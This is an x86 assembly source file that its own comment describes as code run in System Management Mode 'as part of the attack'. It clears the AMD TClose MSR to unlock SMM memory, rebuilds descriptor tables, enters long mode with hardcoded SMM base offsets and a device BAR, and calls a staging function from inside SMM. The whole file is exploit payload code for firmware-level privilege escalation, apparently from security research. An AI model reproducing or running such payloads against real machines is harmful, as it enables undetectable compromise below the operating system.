

#define PROTECT_MODE_CS 0x08
#define PROTECT_MODE_DS 0x20
#define LONG_MODE_CS 	0x38
#define TSS_SEGMENT 	0x40
#define LONG_MODE_DS	0x48

#define ORIGINAL_GDTR			0x1400
#define SQUIRREL_BAR 			0xd0800000
#define CORE0_INITIAL_STACK		0x1E00
#define CORE0_PAGE_TABLE_BASE   0x2000
#define CORE0_NEXT_STAGE        0x1031
#define CORE0_LONG_MODE	        0x1081 /* 0x1081 */

#define CORE0_LONG_MODE_JMP 	0x1081

#define SMM_BASE_OFFSET_CORE0 	0xafe39000+0x7ef8+0x8000


#define X64_STAGING_FUNC_VA		0xfffff6fb7dbee000
#define X64_STAGING_RSP			0xfffff6fb7dbef000

#define IA32_EFER				0xC0000080

#define CORE1_MUTEX_SIGNAL_ADDR	0x3220

.global _core0_shell


.text
/* This code is executed in SMM by Core0 as part of the attack */
_core0_shell:
	.code32
	/* Clear TClose */
	movl $0xc0010113,%ecx
	rdmsr
	and $0xfffffff3,%eax
	wrmsr

	movl     $PROTECT_MODE_DS,%eax
	movl     %eax, %ds
	movl     %eax, %es
	movl     %eax, %fs
	movl     %eax, %gs
	movl     %eax, %ss
    movl $CORE0_INITIAL_STACK,%esp  

	/* Clean the GDT and CS */
	movl 	$ORIGINAL_GDTR,%ecx
	lgdt  	(%ecx)

	pushl	$PROTECT_MODE_CS
    movl 	$CORE0_NEXT_STAGE,%eax
	pushl 	%eax

	lretl

next_stage:

    jmp     ProtFlatMode

.code64
ProtFlatMode:

	mov  	$0x800,%ebx
	mov 	$0x800,(%ebx)
	wbinvd
	rsm
	mov   	$SMM_BASE_OFFSET_CORE0,%eax
	mov 	(%eax),%ecx
	mov 	%ecx,4(%ebx)

	mov 	$CORE0_PAGE_TABLE_BASE,%eax
    mov     %rax,%cr3 
    mov     $0x668,%rax                    /* as cr4.PGE is not set here, refresh cr3 */
	mov     %rax,%cr4

	/* Load TSS */
    sub     $8,%esp                      /* reserve room in stack */
    sgdt    (%rsp)	
    movl    2(%rsp),%eax              /* eax = GDT base*/
    add     $8,%esp
    mov     $0x89,%dl
	movb	%dl, TSS_SEGMENT+5(%rax)	/* clear busy flag*/
    mov     $TSS_SEGMENT,%eax
    ltr     %ax

    mov     $IA32_EFER,%ecx
    rdmsr
    or      $1,%ah                      /* enable LME*/
    wrmsr
    mov     %cr0,%rbx
    or      $0x80010023,%ebx            /* enable paging + WP + NE + MP + PE*/

.code32
	pushl 	$LONG_MODE_CS
	movl  	$CORE0_LONG_MODE,%eax
	pushl  	%eax

	movl     %ebx,%cr0

	lret
/*
.code32
	ljmp     $LONG_MODE_CS, $CORE0_LONG_MODE_JMP
*/

.code64	
LongMode:
	movl     LONG_MODE_DS,%eax
	movl     %eax, %ds
	movl     %eax, %es
	movl     %eax, %fs
	movl     %eax, %gs
	movl     %eax, %ss
	rsm

	mov 	$X64_STAGING_RSP,%rax
	add		$0xF00,%rax 
	mov 	%rax, %rsp

	
	mov 	$X64_STAGING_FUNC_VA, %rax
	call 	*%rax	 

	/* Return from SMM*/
	rsm

	nop
	nop
	nop
	nop
	.byte 'I'
	.byte 'O'
	.byte 'A'	
	nop
	nop
	nop
	nop
	nop

